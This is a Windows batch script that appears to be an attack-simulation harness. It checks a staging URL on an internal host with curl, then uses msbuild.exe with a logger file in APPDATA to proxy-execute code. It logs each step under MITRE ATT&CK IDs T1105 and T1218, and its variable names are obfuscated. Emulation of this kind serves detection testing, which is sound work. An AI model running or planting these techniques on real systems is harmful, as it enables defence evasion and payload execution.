@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\7833\8f365003
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?7833-10
SET hlbnp=ITZEL-S2B
SET pudaazx=10
SET syjfr=project.txt
SET ewjmdkff=7833

SET ljtptzw=%APPDATA%\%pudaazx%
SET yktiifn=%ljtptzw%\macula-simulations.log
SET rqjsrhq=T1218
SET wpgkpj=Signed Binary Proxy Execution

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: script_start=staging>>> "!yktiifn!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_check_start=curl_to_!drguvr!>>> "!yktiifn!" 2>nul
curl -k -s -o nul "!drguvr!"
SET hmpjsu=1
SET pqlpzc=
if errorlevel 1 (
    SET hmpjsu=0
    SET pqlpzc=connection_failed
)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_check_complete=result_!hmpjsu!>>> "!yktiifn!" 2>nul
echo [!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2! !TIME!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1105|Ingress Tool Transfer=!hmpjsu!:!pqlpzc!>> "!yktiifn!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: chdir_start=!pjkcpgw!>>> "!yktiifn!" 2>nul
cd /d "!pjkcpgw!" 2>nul
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: chdir_complete=cd_result_!errorlevel!>>> "!yktiifn!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: process_start=msbuild_execute>>> "!yktiifn!" 2>nul
for /f "delims=" %%G in ('where msbuild.exe 2^>nul') do set tqwefj=%%G
if defined tqwefj (
    "!tqwefj!" /logger:LoggerEntry,"!pjkcpgw!\!syjfr!";MyParameters,Foo
    SET fdszgb=!errorlevel!
    if !fdszgb! equ 0 (
        SET hmpjsu=1
        SET pqlpzc=
    ) else (
        SET hmpjsu=0
        SET pqlpzc=exitcode_!fdszgb!
    )
) else (
    SET hmpjsu=0
    SET pqlpzc=bin_not_found
)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: process_complete=msbuild_result_!hmpjsu!>>> "!yktiifn!" 2>nul
echo [!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2! !TIME!][!hlbnp!]: !pudaazx!-!ewjmdkff!-!rqjsrhq!|!wpgkpj!=!hmpjsu!:!pqlpzc!>> "!yktiifn!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: script_end=complete>>> "!yktiifn!" 2>nul
ENDLOCAL